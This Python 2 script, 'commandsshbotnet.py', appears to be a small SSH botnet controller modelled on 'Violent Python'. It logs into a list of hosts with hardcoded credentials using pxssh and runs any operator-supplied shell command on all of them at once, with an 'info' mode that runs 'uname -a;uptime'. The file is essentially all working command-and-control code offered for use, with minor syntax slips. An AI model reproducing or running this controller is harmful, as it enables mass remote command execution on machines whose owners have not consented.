#!usr/bin/env python

##########################################################
#                                                        #
# commandsshbotnet.py                                    #
# author: @shipcod3                                      #
# inspired by the mass ssh botnet in " Violent Python "  #
#                                                        #
##########################################################

import optparse
import pxssh
import sys

print "[*-*] Engine start..........\n"
print """
                                                .___   ____                                                       _____       .__.__    
  ____  ____   _____   _____ _____    ____    __| _/  /  _ \     ____  ____   ____   ________ __   ___________  _/ ____\____  |__|  |   
_/ ___\/  _ \ /     \ /     \\__  \  /    \  / __ |   >  _ </\ _/ ___\/  _ \ /    \ / ____/  |  \_/ __ \_  __ \ \   __\\__  \ |  |  |   
\  \__(  <_> )  Y Y  \  Y Y  \/ __ \|   |  \/ /_/ |  /  <_\ \/ \  \__(  <_> )   |  < <_|  |  |  /\  ___/|  | \/  |  |   / __ \|  |  |__ 
 \___  >____/|__|_|  /__|_|  (____  /___|  /\____ |  \_____\ \  \___  >____/|___|  /\__   |____/  \___  >__|     |__|  (____  /__|____/ 
     \/            \/      \/     \/     \/      \/         \/      \/           \/    |__|           \/                    \/          
""""

class Client:
    def __init__(self, host, user, password):
        self.host = host
        self.user = user
        self.password = password
        self.session = self.connect()

    def connect(self):
        try:
            s = pxssh.pxssh()
            s.login(self.host, self.user, self.password)
            return s
        except:
            print '[-] Error Connecting'

    def send_command(self, cmd):
        self.session.sendline(cmd)
        self.session.prompt()  #match the prompt
        return self.session.before # print everything before the prompt

def usage():
    print """
    *********
    Commands:
    *********
    python commandsshbotnet.py os <command> - For control"
    python commandsshbotnet.py info - Print information"
    """

def main(argv):
    if len(argv) < 2:
        return usage()

    arg_command = sys.argv[1]

    def botnetCommand(command):
        for client in botNet:
            output = client.send_command(command)
            print '[*] IP: ' + client.host
            print '[+] Command: ' + output

    def info(command):
        for client in botNet:
            output = client.send_command(command)
            print '[*] IP: ' + client.host
            print output.strip('uname -a;uptime')

    def addClient(host, user, password):
        client = Client(host, user, password)
        botNet.append(client)

    botNet = []
    #add your host, user, and password here 
    addClient('127.0.0.1', 'celso', 'celso123') #sample config
    addClient('127.0.0.2', 'celso', 'celso123')

    if arg_command == "os":
        try:
            os_command = sys.argv[2]
            botnetCommand(os_command)
        except:
            return usage()
            
    elif arg_command == "info":
        info("uname -a;uptime")

    else:
        return usage()

if __name__ == "__main__":
    main(sys.argv)

###
#
# I have been contributing to Metasploit lately which pwns IRC Botnets lately and will comeup with a PoC
# for these kind of bots soon. More IRC Bot exploits:  https://github.com/shipcod3/IRC-Bot-Hunters
# - shipcod3
###
